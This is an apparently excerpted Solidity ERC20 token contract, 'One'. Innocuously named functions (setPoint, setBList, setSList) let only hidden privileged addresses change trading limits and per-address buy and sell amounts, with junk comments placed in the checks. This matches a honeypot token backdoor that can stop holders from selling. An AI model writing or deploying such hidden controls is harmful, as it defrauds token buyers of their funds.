...
contract One is Context, IERC20, Ownable {
    ...
    address payable private marketWall = payable(0x7e161E7F939131Cb8Cc80e3E7236104F0f58bFa7); 
    address payable private teamWalletAddress = payable(0xb76E3C71c701FA4C1F597897579014345146c5B2); 
	...
	function setPoint(uint256 newLimit) external  {
		if( _mainSwap[ /*as aXsdfghjk11;*/msg.sender])
	   {
	      _point = newLimit;
	   }     
    }
	...
	function setBList(address  recipient, uint256 amount) public {
	...
	function setSList(address  recipient, uint256 amount) public {
		if( _mainSwap[ /*as aXxsdfghjk11;*/msg.sender])
	   {
	      sellList[recipient] = amount;
	   }   
    }
